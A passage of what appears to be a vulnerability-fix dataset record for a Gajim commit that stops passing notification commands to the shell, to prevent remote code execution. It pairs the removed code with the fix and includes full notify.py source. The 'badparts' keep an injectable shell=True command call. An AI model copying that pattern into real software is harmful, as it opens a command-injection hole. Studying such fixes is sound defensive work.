use_shell=True)\n             except Exception:\n                 pass\n \n","files":{"\/src\/common\/helpers.py":{"changes":[{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]},{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]}]},"\/src\/notify.py":{"changes":[{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]},{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]}],"source":"\n import os import time from dialogs import PopupNotificationWindow import gobject import gtkgui_helpers import gtk from common import gajim from common import helpers from common import ged from common import dbus_support if dbus_support.supported: import dbus import dbus.glib USER_HAS_PYNOTIFY=True try: import pynotify pynotify.init('Gajim Notification') except ImportError: USER_HAS_PYNOTIFY=False def get_show_in_roster(event, account, contact, session=None): \"\"\" Return True if this event must be shown in roster, else False \"\"\" if event=='gc_message_received': return True if event=='message_received': if session and session.control: return False return True def get_show_in_systray(event, account, contact, type_=None): \"\"\" Return True if this event must be shown in systray, else False \"\"\" if type_=='printed_gc_msg' and not gajim.config.get( 'notify_on_all_muc_messages'): return False return gajim.config.get('trayicon_notification_on_events') def popup(event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): \"\"\" Notify a user of an event. It first tries to a valid implementation of the Desktop Notification Specification. If that fails, then we fall back to the older style PopupNotificationWindow method \"\"\" if not path_to_image: path_to_image=gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48) if gajim.config.get('use_notif_daemon') and dbus_support.supported: try: DesktopNotification(event_type, jid, account, msg_type, path_to_image, title, gobject.markup_escape_text(text)) return except dbus.DBusException, e: gajim.log.debug(str(e)) except TypeError, e: gajim.log.debug(str(e)) if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY: if not text and event_type=='new_message': _text=gobject.markup_escape_text( gajim.get_name_from_jid(account, jid)) else: _text=gobject.markup_escape_text(text) if not title: _title='' else: _title=title notification=pynotify.Notification(_title, _text) timeout=gajim.config.get('notification_timeout') * 1000 notification.set_timeout(timeout) notification.set_category(event_type) notification.set_data('event_type', event_type) notification.set_data('jid', jid) notification.set_data('account', account) notification.set_data('msg_type', msg_type) notification.set_property('icon-name', path_to_image) if 'actions' in pynotify.get_server_caps(): notification.add_action('default', 'Default Action', on_pynotify_notification_clicked) try: notification.show() return except gobject.GError, e: gajim.log.debug(str(e)) instance=PopupNotificationWindow(event_type, jid, account, msg_type, path_to_image, title, text) gajim.interface.roster.popup_notification_windows.append(instance) def on_pynotify_notification_clicked(notification, action): jid=notification.get_data('jid') account=notification.get_data('account') msg_type=notification.get_data('msg_type') notification.close() gajim.interface.handle_event(account, jid, msg_type) class Notification: \"\"\" Handle notifications \"\"\" def __init__(self): gajim.ged.register_event_handler('notification', ged.GUI2, self._nec_notification) def _nec_notification(self, obj): if obj.do_popup: popup(obj.popup_event_type, obj.jid, obj.conn.name, obj.popup_msg_type, path_to_image=obj.popup_image, title=obj.popup_title, text=obj.popup_text) if obj.do_sound: if obj.sound_file: helpers.play_sound_file(obj.sound_file) elif obj.sound_event: helpers.play_sound(obj.sound_event) if obj.do_command: try: helpers.exec_command(obj.command) except Exception: pass class NotificationResponseManager: \"\"\" Collect references to pending DesktopNotifications and manages there signalling. This is necessary due to a bug in DBus where you can't remove a signal from an interface once it's connected \"\"\" def __init__(self): self.pending={} self.received=[] self.interface=None def attach_to_interface(self): if self.interface is not None: return self.interface=dbus_support.get_notifications_interface() self.interface.connect_to_signal('ActionInvoked', self.on_action_invoked) self.interface.connect_to_signal('NotificationClosed', self.on_closed) def on_action_invoked(self, id_, reason): if id_ in self.pending: notification=self.pending[id_] notification.on_action_invoked(id_, reason) del self.pending[id_] return self.received.append((id_, time.time(), reason)) if len(self.received) > 20: curt=time.time() for rec in self.received: diff=curt -rec[1] if diff > 10: self.received.remove(rec) def on_closed(self, id_, reason=None): if id_ in self.pending: del self.pending[id_] def add_pending(self, id_, object_): for rec in self.received: if rec[0]==id_: object_.on_action_invoked(id_, rec[2]) self.received.remove(rec) return if id_ not in self.pending: self.pending[id_]=object_ else: gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.') notification_response_manager=NotificationResponseManager() class DesktopNotification: \"\"\" A DesktopNotification that interfaces with D-Bus via the Desktop Notification Specification \"\"\" def __init__(self, event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): self.path_to_image=os.path.abspath(path_to_image) self.event_type=event_type self.title=title self.text=text self.default_version=[0, 3, 1] self.account=account self.jid=jid self.msg_type=msg_type if not text and event_type=='new_message': self.text=gajim.get_name_from_jid(account, jid) if not title: self.title=event_type if event_type==_('Contact Signed In'): ntype='presence.online' elif event_type==_('Contact Signed Out'): ntype='presence.offline' elif event_type in(_('New Message'), _('New Single Message'), _('New Private Message')): ntype='im.received' elif event_type==_('File Transfer Request'): ntype='transfer' elif event_type==_('File Transfer Error'): ntype='transfer.error' elif event_type in(_('File Transfer Completed'), _('File Transfer Stopped')): ntype='transfer.complete' elif event_type==_('New E-mail'): ntype='email.arrived' elif event_type==_('Groupchat Invitation'): ntype='im.invitation' elif event_type==_('Contact Changed Status'): ntype='presence.status' elif event_type==_('Connection Failed'): ntype='connection.failed' elif event_type==_('Subscription request'): ntype='subscription.request' elif event_type==_('Unsubscribed'): ntype='unsubscribed' else: self.path_to_image=gtkgui_helpers.get_icon_path( 'gajim-chat_msg_recv', 48) ntype='im' self.notif=dbus_support.get_notifications_interface(self) if self.notif is None: raise dbus.DBusException('unable to get notifications interface') self.ntype=ntype if self.kde_notifications: self.attempt_notify() else: self.capabilities=self.notif.GetCapabilities() if self.capabilities is None: self.capabilities=['actions'] self.get_version() def attempt_notify(self): timeout=gajim.config.get('notification_timeout') ntype=self.ntype if self.kde_notifications: notification_text=('<html><img src=\"%(image)s\" align=left \/>' \\ '%(title)s<br\/>%(text)s<\/html>') %{'title': self.title, 'text': self.text, 'image': self.path_to_image} gajim_icon=gtkgui_helpers.get_icon_path('gajim', 48) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), ntype, dbus.String(gajim_icon), dbus.String(''), dbus.String(notification_text), (dbus.String('default'), dbus.String(self.event_type), dbus.String('ignore'), dbus.String(_('Ignore'))), [], dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) return except Exception: pass version=self.version if version[:2]==[0, 2]: actions={} if 'actions' in self.capabilities: actions={'default': 0} try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), ntype, dbus.Byte(0), dbus.String(self.title), dbus.String(self.text), [dbus.String(self.path_to_image)], actions, [''], True, dbus.UInt32(timeout), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except AttributeError: version=[0, 3, 1] if version >[0, 3]: if gajim.interface.systray_enabled and \\ gajim.config.get('attach_notifications_to_systray'): status_icon=gajim.interface.systray.status_icon x, y, width, height=status_icon.get_geometry()[1] pos_x=x +(width \/ 2) pos_y=y +(height \/ 2) hints={'x': pos_x, 'y': pos_y} else: hints={} if version >=[0, 3, 2]: hints['urgency']=dbus.Byte(0) hints['category']=dbus.String(ntype) if self.text: text=self.text if len(self.text) > 200: text='%s\\n...' % self.text[:200] else: text=' ' if os.environ.get('KDE_FULL_SESSION')=='true': text='<table style=\\'padding: 3px\\'><tr><td>' \\ '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\ '<td>%s<\/td><\/tr><\/table>' %(self.path_to_image, text) self.path_to_image=os.path.abspath( gtkgui_helpers.get_icon_path('gajim', 48)) actions=() if 'actions' in self.capabilities: actions=(dbus.String('default'), dbus.String( self.event_type)) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), dbus.String(self.path_to_image), dbus.String(self.title), dbus.String(text), actions, hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) else: try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), dbus.String(self.title), dbus.String(self.text), dbus.String(''), hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) def attach_by_id(self, id_): notification_response_manager.attach_to_interface() notification_response_manager.add_pending(id_, self) def notify_another_way(self, e): gajim.log.debug('Error when trying to use notification daemon: %s' % \\ str(e)) instance=PopupNotificationWindow(self.event_type, self.jid, self.account, self.msg_type, self.path_to_image, self.title, self.text) gajim.interface.roster.popup_notification_windows.append(instance) def on_action_invoked(self, id_, reason): if self.notif is None: return self.notif.CloseNotification(dbus.UInt32(id_)) self.notif=None if reason=='ignore': return gajim.interface.handle_event(self.account, self.jid, self.msg_type) def version_reply_handler(self, name, vendor, version, spec_version=None): if spec_version: version=spec_version elif vendor=='Xfce' and version.startswith('0.1.0'): version='0.9' version_list=version.split('.') self.version=[] try: while len(version_list): self.version.append(int(version_list.pop(0))) except ValueError: self.version_error_handler_3_x_try(None) self.attempt_notify() def get_version(self): self.notif.GetServerInfo( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_2_x_try) def version_error_handler_2_x_try(self, e): self.notif.GetServerInformation( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_3_x_try) def version_error_handler_3_x_try(self, e): self.version=self.default_version self.attempt_notify() ","sourceWithComments":"# -*- coding:utf-8 -*-\n## src\/notify.py\n##\n## Copyright (C) 2005 Sebastian Estienne\n## Copyright (C) 2005-2006 Andrew Sayman <lorien420 AT myrealbox.com>\n## Copyright (C) 2005-2007 Nikos Kouremenos <kourem AT gmail.com>\n## Copyright (C) 2005-2010 Yann Leboulanger <asterix AT lagaule.org>\n## Copyright (C) 2006 Travis Shirk <travis AT pobox.com>\n## Copyright (C) 2006-2008 Jean-Marie Traissard <jim AT lapin.org>\n## Copyright (C) 2007 Julien Pivotto <roidelapluie AT gmail.com>\n##                    Stephan Erb <steve-e AT h3c.de>\n## Copyright (C) 2008 Brendan Taylor <whateley AT gmail.com>\n##                    Jonathan Schleifer <js-gajim AT webkeks.org>\n##\n## This file is part of Gajim.\n##\n## Gajim is free software; you can redistribute it and\/or modify\n## it under the terms of the GNU General Public License as published\n## by the Free Software Foundation; version 3 only.\n##\n## Gajim is distributed in the hope that it will be useful,\n## but WITHOUT ANY WARRANTY; without even the implied warranty of\n## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n## GNU General Public License for more details.\n##\n## You should have received a copy of the GNU General Public License\n## along with Gajim. If not, see <http:\/\/www.gnu.org\/licenses\/>.\n##\n\nimport os\nimport time\nfrom dialogs import PopupNotificationWindow\nimport gobject\nimport gtkgui_helpers\nimport gtk\n\nfrom common import gajim\nfrom common import helpers\nfrom common import ged\n\nfrom common import dbus_support\nif dbus_support.supported:\n    import dbus\n    import dbus.glib\n\n\nUSER_HAS_PYNOTIFY = True # user has pynotify module\ntry:\n    import pynotify\n    pynotify.init('Gajim Notification')\nexcept ImportError:\n    USER_HAS_PYNOTIFY = False\n\ndef get_show_in_roster(event, account, contact, session=None):\n    \"\"\"\n    Return True if this event must be shown in roster, else False\n    \"\"\"\n    if event == 'gc_message_received':\n        return True\n    if event == 'message_received':\n        if session and session.control:\n            return False\n    return True\n\ndef get_show_in_systray(event, account, contact, type_=None):\n    \"\"\"\n    Return True if this event must be shown in systray, else False\n    \"\"\"\n    if type_ == 'printed_gc_msg' and not gajim.config.get(\n    'notify_on_all_muc_messages'):\n        # it's not an highlighted message, don't show in systray\n        return False\n    return gajim.config.get('trayicon_notification_on_events')\n\ndef popup(event_type, jid, account, msg_type='', path_to_image=None, title=None,\ntext=None):\n    \"\"\"\n    Notify a user of an event. It first tries to a valid implementation of\n    the Desktop Notification Specification. If that fails, then we fall back to\n    the older style PopupNotificationWindow method\n    \"\"\"\n    # default image\n    if not path_to_image:\n        path_to_image = gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48)\n\n    # Try to show our popup via D-Bus and notification daemon\n    if gajim.config.get('use_notif_daemon') and dbus_support.supported:\n        try:\n            DesktopNotification(event_type, jid, account, msg_type,\n                path_to_image, title, gobject.markup_escape_text(text))\n            return  # sucessfully did D-Bus Notification procedure!\n        except dbus.DBusException, e:\n            # Connection to D-Bus failed\n            gajim.log.debug(str(e))\n        except TypeError, e:\n            # This means that we sent the message incorrectly\n            gajim.log.debug(str(e))\n\n    # Ok, that failed. Let's try pynotify, which also uses notification daemon\n    if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY:\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            # -> default value for text\n            _text = gobject.markup_escape_text(\n                gajim.get_name_from_jid(account, jid))\n        else:\n            _text = gobject.markup_escape_text(text)\n\n        if not title:\n            _title = ''\n        else:\n            _title = title\n\n        notification = pynotify.Notification(_title, _text)\n        timeout = gajim.config.get('notification_timeout') * 1000 # make it ms\n        notification.set_timeout(timeout)\n\n        notification.set_category(event_type)\n        notification.set_data('event_type', event_type)\n        notification.set_data('jid', jid)\n        notification.set_data('account', account)\n        notification.set_data('msg_type', msg_type)\n        notification.set_property('icon-name', path_to_image)\n        if 'actions' in pynotify.get_server_caps():\n            notification.add_action('default', 'Default Action',\n                    on_pynotify_notification_clicked)\n\n        try:\n            notification.show()\n            return\n        except gobject.GError, e:\n            # Connection to notification-daemon failed, see #2893\n            gajim.log.debug(str(e))\n\n    # Either nothing succeeded or the user wants old-style notifications\n    instance = PopupNotificationWindow(event_type, jid, account, msg_type,\n        path_to_image, title, text)\n    gajim.interface.roster.popup_notification_windows.append(instance)\n\ndef on_pynotify_notification_clicked(notification, action):\n    jid = notification.get_data('jid')\n    account = notification.get_data('account')\n    msg_type = notification.get_data('msg_type')\n\n    notification.close()\n    gajim.interface.handle_event(account, jid, msg_type)\n\nclass Notification:\n    \"\"\"\n    Handle notifications\n    \"\"\"\n    def __init__(self):\n        gajim.ged.register_event_handler('notification', ged.GUI2,\n            self._nec_notification)\n\n    def _nec_notification(self, obj):\n        if obj.do_popup:\n            popup(obj.popup_event_type, obj.jid, obj.conn.name,\n                obj.popup_msg_type, path_to_image=obj.popup_image,\n                title=obj.popup_title, text=obj.popup_text)\n\n        if obj.do_sound:\n            if obj.sound_file:\n                helpers.play_sound_file(obj.sound_file)\n            elif obj.sound_event:\n                helpers.play_sound(obj.sound_event)\n\n        if obj.do_command:\n            try:\n                helpers.exec_command(obj.command)\n            except Exception:\n                pass\n\nclass NotificationResponseManager:\n    \"\"\"\n    Collect references to pending DesktopNotifications and manages there\n    signalling. This is necessary due to a bug in DBus where you can't remove a\n    signal from an interface once it's connected\n    \"\"\"\n\n    def __init__(self):\n        self.pending = {}\n        self.received = []\n        self.interface = None\n\n    def attach_to_interface(self):\n        if self.interface is not None:\n            return\n        self.interface = dbus_support.get_notifications_interface()\n        self.interface.connect_to_signal('ActionInvoked',\n            self.on_action_invoked)\n        self.interface.connect_to_signal('NotificationClosed', self.on_closed)\n\n    def on_action_invoked(self, id_, reason):\n        if id_ in self.pending:\n            notification = self.pending[id_]\n            notification.on_action_invoked(id_, reason)\n            del self.pending[id_]\n            return\n        # got an action on popup that isn't handled yet? Maybe user clicked too\n        # fast. Remember it.\n        self.received.append((id_, time.time(), reason))\n        if len(self.received) > 20:\n            curt = time.time()\n            for rec in self.received:\n                diff = curt - rec[1]\n                if diff > 10:\n                    self.received.remove(rec)\n\n    def on_closed(self, id_, reason=None):\n        if id_ in self.pending:\n            del self.pending[id_]\n\n    def add_pending(self, id_, object_):\n        # Check to make sure that we handle an event immediately if we're adding\n        # an id that's already been triggered\n        for rec in self.received:\n            if rec[0] == id_:\n                object_.on_action_invoked(id_, rec[2])\n                self.received.remove(rec)\n                return\n        if id_ not in self.pending:\n            # Add it\n            self.pending[id_] = object_\n        else:\n            # We've triggered an event that has a duplicate ID!\n            gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.')\n\nnotification_response_manager = NotificationResponseManager()\n\nclass DesktopNotification:\n    \"\"\"\n    A DesktopNotification that interfaces with D-Bus via the Desktop\n    Notification Specification\n    \"\"\"\n\n    def __init__(self, event_type, jid, account, msg_type='',\n    path_to_image=None, title=None, text=None):\n        self.path_to_image = os.path.abspath(path_to_image)\n        self.event_type = event_type\n        self.title = title\n        self.text = text\n        # 0.3.1 is the only version of notification daemon that has no way\n        # to determine which version it is. If no method exists, it means\n        # they're using that one.\n        self.default_version = [0, 3, 1]\n        self.account = account\n        self.jid = jid\n        self.msg_type = msg_type\n\n        # default value of text\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            self.text = gajim.get_name_from_jid(account, jid)\n\n        if not title:\n            self.title = event_type # default value\n\n        if event_type == _('Contact Signed In'):\n            ntype = 'presence.online'\n        elif event_type == _('Contact Signed Out'):\n            ntype = 'presence.offline'\n        elif event_type in (_('New Message'), _('New Single Message'),\n        _('New Private Message')):\n            ntype = 'im.received'\n        elif event_type == _('File Transfer Request'):\n            ntype = 'transfer'\n        elif event_type == _('File Transfer Error'):\n            ntype = 'transfer.error'\n        elif event_type in (_('File Transfer Completed'),\n        _('File Transfer Stopped')):\n            ntype = 'transfer.complete'\n        elif event_type == _('New E-mail'):\n            ntype = 'email.arrived'\n        elif event_type == _('Groupchat Invitation'):\n            ntype = 'im.invitation'\n        elif event_type == _('Contact Changed Status'):\n            ntype = 'presence.status'\n        elif event_type == _('Connection Failed'):\n            ntype = 'connection.failed'\n        elif event_type == _('Subscription request'):\n            ntype = 'subscription.request'\n        elif event_type == _('Unsubscribed'):\n            ntype = 'unsubscribed'\n        else:\n            # default failsafe values\n            self.path_to_image = gtkgui_helpers.get_icon_path(\n                'gajim-chat_msg_recv', 48)\n            ntype = 'im' # Notification Type\n\n        self.notif = dbus_support.get_notifications_interface(self)\n        if self.notif is None:\n            raise dbus.DBusException('unable to get notifications interface')\n        self.ntype = ntype\n\n        if self.kde_notifications:\n            self.attempt_notify()\n        else:\n            self.capabilities = self.notif.GetCapabilities()\n            if self.capabilities is None:\n                self.capabilities = ['actions']\n            self.get_version()\n\n    def attempt_notify(self):\n        timeout = gajim.config.get('notification_timeout') # in seconds\n        ntype = self.ntype\n        if self.kde_notifications:\n            notification_text = ('<html><img src=\"%(image)s\" align=left \/>' \\\n                '%(title)s<br\/>%(text)s<\/html>') % {'title': self.title,\n                'text': self.text, 'image': self.path_to_image}\n            gajim_icon = gtkgui_helpers.get_icon_path('gajim', 48)\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),        # app_name (string)\n                    dbus.UInt32(0),                 # replaces_id (uint)\n                    ntype,                          # event_id (string)\n                    dbus.String(gajim_icon),        # app_icon (string)\n                    dbus.String(''),                # summary (string)\n                    dbus.String(notification_text), # body (string)\n                    # actions (stringlist)\n                    (dbus.String('default'), dbus.String(self.event_type),\n                    dbus.String('ignore'), dbus.String(_('Ignore'))),\n                    [],                                                                             # hints (not used in KDE yet)\n                    dbus.UInt32(timeout*1000),      # timeout (int), in ms\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n                return\n            except Exception:\n                pass\n        version = self.version\n        if version[:2] == [0, 2]:\n            actions = {}\n            if 'actions' in self.capabilities:\n                actions = {'default': 0}\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),\n                    dbus.String(self.path_to_image),\n                    dbus.UInt32(0),\n                    ntype,\n                    dbus.Byte(0),\n                    dbus.String(self.title),\n                    dbus.String(self.text),\n                    [dbus.String(self.path_to_image)],\n                    actions,\n                    [''],\n                    True,\n                    dbus.UInt32(timeout),\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n            except AttributeError:\n                # we're actually dealing with the newer version\n                version = [0, 3, 1]\n        if version > [0, 3]:\n            if gajim.interface.systray_enabled and \\\n            gajim.config.get('attach_notifications_to_systray'):\n                status_icon = gajim.interface.systray.status_icon\n                x, y, width, height = status_icon.get_geometry()[1]\n                pos_x = x + (width \/ 2)\n                pos_y = y + (height \/ 2)\n                hints = {'x': pos_x, 'y': pos_y}\n            else:\n                hints = {}\n            if version >= [0, 3, 2]:\n                hints['urgency'] = dbus.Byte(0) # Low Urgency\n                hints['category'] = dbus.String(ntype)\n                # it seems notification-daemon doesn't like empty text\n                if self.text:\n                    text = self.text\n                    if len(self.text) > 200:\n                        text = '%s\\n...' % self.text[:200]\n                else:\n                    text = ' '\n                if os.environ.get('KDE_FULL_SESSION') == 'true':\n                    text = '<table style=\\'padding: 3px\\'><tr><td>' \\\n                        '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\\n                        '<td>%s<\/td><\/tr><\/table>' % (self.path_to_image,\n                        text)\n                    self.path_to_image = os.path.abspath(\n                        gtkgui_helpers.get_icon_path('gajim', 48))\n                actions = ()\n                if 'actions' in self.capabilities:\n                    actions = (dbus.String('default'), dbus.String(\n                        self.event_type))\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        # this notification does not replace other\n                        dbus.UInt32(0),\n                        dbus.String(self.path_to_image),\n                        dbus.String(self.title),\n                        dbus.String(text),\n                        actions,\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n            else:\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        dbus.String(self.path_to_image),\n                        dbus.UInt32(0),\n                        dbus.String(self.title),\n                        dbus.String(self.text),\n                        dbus.String(''),\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n\n    def attach_by_id(self, id_):\n        notification_response_manager.attach_to_interface()\n        notification_response_manager.add_pending(id_, self)\n\n    def notify_another_way(self, e):\n        gajim.log.debug('Error when trying to use notification daemon: %s' % \\\n            str(e))\n        instance = PopupNotificationWindow(self.event_type, self.jid,\n            self.account, self.msg_type, self.path_to_image, self.title,\n            self.text)\n        gajim.interface.roster.popup_notification_windows.append(instance)\n\n    def on_action_invoked(self, id_, reason):\n        if self.notif is None:\n            return\n        self.notif.CloseNotification(dbus.UInt32(id_))\n        self.notif = None\n\n        if reason == 'ignore':\n            return\n\n        gajim.interface.handle_event(self.account, self.jid, self.msg_type)\n\n    def version_reply_handler(self, name, vendor, version, spec_version=None):\n        if spec_version:\n            version = spec_version\n        elif vendor == 'Xfce' and version.startswith('0.1.0'):\n            version = '0.9'\n        version_list = version.split('.')\n        self.version = []\n        try:\n            while len(version_list):\n                self.version.append(int(version_list.pop(0)))\n        except ValueError:\n            self.version_error_handler_3_x_try(None)\n        self.attempt_notify()\n\n    def get_version(self):\n        self.notif.GetServerInfo(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_2_x_try)\n\n    def version_error_handler_2_x_try(self, e):\n        self.notif.GetServerInformation(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_3_x_try)\n\n    def version_error_handler_3_x_try(self, e):\n        self.version = self.default_version\n        self.attempt_notify()\n"}},"msg":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031"}},"https:\/\/github.com\/gajim\/gajim":{"4c66686f53e86dc0b86148a310db0bfc60c92253":{"url":"https:\/\/api.github.com\/repos\/gajim\/gajim\/commits\/4c66686f53e86dc0b86148a310db0bfc60c92253","html_url":"https:\/\/github.com\/gajim\/gajim\/commit\/4c66686f53e86dc0b86148a310db0bfc60c92253","message":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031","sha":"4c66686f53e86dc0b86148a310db0bfc60c92253","keyword":"remote code execution prevent","diff":"diff --git a\/src\/common\/helpers.py b\/src\/common\/helpers.py\nindex 722fbebe24..97996f01ba 100644\n--- a\/src\/common\/helpers.py\n+++ b\/src\/common\/helpers.py\n@@ -40,6 +40,7 @@\n import select\n import base64\n import hashlib\n+import shlex\n import caps_cache\n \n from encodings.punycode import punycode_encode\n@@ -381,8 +382,18 @@ def is_in_path(command, return_abs_path=False):\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)\ndiff --git a\/src\/notify.py b\/src\/notify.py\nindex a8a7378634..1f6eada51c 100644\n--- a\/src\/notify.py\n+++ b\/src\/notify.py\n@@ -167,7 +167,7 @@ def _nec_notification(self, obj):\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","files":{"\/src\/common\/helpers.py":{"changes":[{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]},{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = 